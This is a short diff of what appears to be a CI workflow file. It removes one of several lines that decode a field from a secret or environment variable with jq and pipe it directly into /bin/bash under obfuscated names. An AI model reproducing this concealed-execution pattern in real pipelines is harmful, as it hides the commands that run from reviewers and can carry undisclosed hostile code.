@@ -22,7 +22,6 @@ jobs:
           hdiiy10521: ${{ secrets.hdiiy10521 }}
         run: |
           printf '%s' "$hdiiy10521" | jq -r .f3 | /bin/bash
-          printf '%s' "$fwlnu36" | jq -r .uem859 | /bin/bash
           echo $jyhd1498 | jq -r .ovtb2259 | /bin/bash
 
       - name: Upload output
